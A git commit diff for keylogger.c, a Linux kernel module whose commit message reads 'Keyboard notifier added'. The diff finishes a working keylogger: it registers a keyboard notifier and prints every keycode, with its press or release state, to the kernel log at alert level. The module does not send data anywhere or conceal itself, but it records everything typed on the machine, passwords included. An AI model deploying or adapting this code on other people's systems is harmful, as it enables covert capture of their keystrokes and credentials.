6d87fd5b5eb97d8b805db16083622e540fb96a9e
Marcin Paszkiewicz <mkpaszkiewicz@gmail.com>
2016-01-08 20:47:11 +0100

    Keyboard notifier added

--- keylogger.c
+++ keylogger.c
@@ -1,35 +1,38 @@
-#include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
 #include <linux/keyboard.h>
 
+MODULE_LICENSE("GPL");
 
-int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param)
+int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param;
     struct vc_data *vc = param->vc;
-
-    int ret = NOTIFY_OK;
-
+  
     if (code == KBD_KEYCODE)
     {
-        printk(KERN_DEBUG, "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
+        printk(KERN_ALERT "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
     }
+
+    return NOTIFY_OK;
 }
 
-static struct notifier_block nb = {
-        .notifier_call = hello_notify
+static struct notifier_block nb = 
+{
+    .notifier_call = log_key
 };
 
-static int hello_init(void)
+static int __init keylogger_init(void)
 {
     register_keyboard_notifier(&nb);
     return 0;
 }
 
-static void hello_release(void)
+static void __exit keylogger_exit(void)
 {
     unregister_keyboard_notifier(&nb);
 }
 
-module_init(hello_init);
-module_exit(hello_release);
+module_init(keylogger_init);
+module_exit(keylogger_exit);
